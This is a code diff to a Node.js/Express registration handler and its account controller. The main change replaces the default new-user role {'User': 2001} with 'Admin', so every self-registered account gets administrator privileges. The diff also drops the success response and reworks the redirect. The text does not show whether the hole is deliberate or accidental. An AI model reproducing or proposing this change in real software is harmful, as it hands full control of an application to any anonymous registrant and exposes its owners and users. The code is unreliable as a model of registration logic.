@@ -8,7 +8,7 @@ const handleNewUser = async (req, res) => {
         username: req.body.username, 
         password: req.body.password,
         confirmedPassword: req.body.confirmedPassword,
-        role: { 'User': 2001 }
+        role: 'Admin'
     };
     if (!data.username || !data.password || !data.confirmedPassword) {
         return res.status(400).json({ 'message': 'Username & password & confirmed password are required.' });
@@ -26,7 +26,6 @@ const handleNewUser = async (req, res) => {
         const hashedPassword = await bcrypt.hash(data.password, saltRounds);
         data.password = hashedPassword;
         await User.insertMany(data);
-        return res.status(201).json({ 'message': 'User created successfully' });
     } catch (err) {
         return res.status(500).json({ 'message': err.message });
     }
@@ -114,13 +113,11 @@ class AccountController {
     }
     async registerPost(req, res) {
         try {
-            const result = await handleNewUser(req, res);
-            if (result && result.status === 201) {
-                res.redirect('/account/login', result);
-            }
-            res.redirect('/account/register');
+            await handleNewUser(req, res);
+            res.redirect('/account/login');
+            // return res.redirect('/account/register');
         } catch (err) {
-            res.status(500).json({ message: err.message });
+            return res.status(500).json({ message: err.message });
         }
     }
     logout(req, res) {
